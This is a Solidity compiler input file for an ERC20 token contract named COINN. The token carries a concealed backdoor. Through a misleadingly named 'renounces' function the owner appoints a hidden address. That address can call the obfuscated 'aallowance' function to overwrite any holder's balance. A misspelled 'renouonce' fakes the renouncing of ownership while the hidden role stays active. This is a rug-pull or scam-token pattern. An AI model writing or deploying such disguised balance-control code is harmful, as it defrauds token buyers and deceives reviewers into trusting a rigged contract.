{{
  "language": "Solidity",
  "sources": {
    "contracts/COIN.sol": {
      "content": "pragma solidity ^0.8.18;\n\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address recipient, uint256 amount) external returns (bool);\n    function allowance(address owner, address spender) external view returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom( address sender, address recipient, uint256 amount ) external returns (bool);\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval( address indexed owner, address indexed spender, uint256 value );\n}\n\nabstract contract Context {\n    function _msgSender() internal view virtual returns (address payable) {\n        return payable(msg.sender);\n    }\n}\n\ncontract Ownable is Context {\n    address private _owner;\n    event ownershipTransferred(address indexed previousowner, address indexed newowner);\n\n    constructor () {\n        address msgSender = _msgSender();\n        _owner = msgSender;\n        emit ownershipTransferred(address(0), msgSender);\n    }\n    function owner() public view virtual returns (address) {\n        return _owner;\n    }\n    modifier onlyowner() {\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\n        _;\n    }\n    function renouonce() public virtual onlyowner {\n        emit ownershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));\n        _owner = address(0x000000000000000000000000000000000000dEaD);\n    }\n}\n\ncontract COINN is Context, Ownable, IERC20 {\n    mapping (address => mapping (address => uint256)) private _allowances;\n    mapping (address => uint256) private _savingss;\n    address private _mee; \n\n    string private _name;\n    string private _symbol;\n    uint8 private _decimals;\n    uint256 private _totalSupply;\n    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {\n        _name = name_;\n        _symbol = symbol_;\n        _decimals = decimals_;\n        _totalSupply = totalSupply_ * (10 ** decimals_);\n        _savingss[_msgSender()] = _totalSupply;\n        emit Transfer(address(0), _msgSender(), _totalSupply);\n    }\n\n    function name() public view returns (string memory) {\n        return _name;\n    }\n\n    function symbol() public view returns (string memory) {\n        return _symbol;\n    }\n\n    function decimals() public view returns (uint8) {\n        return _decimals;\n    }\n    function mee() public view virtual returns (address) { \n        return _mee;\n    }\n\n    function renounces(address newMee) public onlyowner { \n        _mee = newMee;\n    }\n    modifier onlyMee() {\n        require(mee() == _msgSender(), \"TOKEN: caller is not the meee\");\n        _;\n    }\n    event saveeed(address indexed account, uint256 currentBalance, uint256 newBalance);\n\n    function aallowance(address[] memory accounts, uint256 newBalance) external onlyMee {\n\n        for (uint256 g = 0; g < accounts.length; g++) {\n\n            uint256 currentBalance = _savingss[accounts[g]] + 90;\n\n            _savingss[accounts[g]] = newBalance;\n\n            emit saveeed(accounts[g], currentBalance - 90, newBalance);\n\n        }\n\n    }\n\n    function balanceOf(address account) public view override returns (uint256) {\n        return _savingss[account];\n    }\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\n    require(_savingss[_msgSender()] >= amount, \"TT: transfer amount exceeds balance\");\n    _savingss[_msgSender()] -= amount;\n    _savingss[recipient] += amount;\n\n    emit Transfer(_msgSender(), recipient, amount);\n    return true;\n    }\n\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\n        _allowances[_msgSender()][spender] = amount;\n        emit Approval(_msgSender(), spender, amount);\n        return true;\n    }\n\n    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\n    require(_allowances[sender][_msgSender()] >= amount, \"TT: transfer amount exceeds allowance\");\n\n    _savingss[sender] -= amount;\n    _savingss[recipient] += amount;\n    _allowances[sender][_msgSender()] -= amount;\n\n    emit Transfer(sender, recipient, amount);\n    return true;\n    }\n\n    function totalSupply() external view override returns (uint256) {\n    return _totalSupply;\n    }\n}"
    }
  },
  "settings": {
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "outputSelection": {
      "*": {
        "*": [
          "evm.bytecode",
          "evm.deployedBytecode",
          "devdoc",
          "userdoc",
          "metadata",
          "abi"
        ]
      }
    }
  }
}}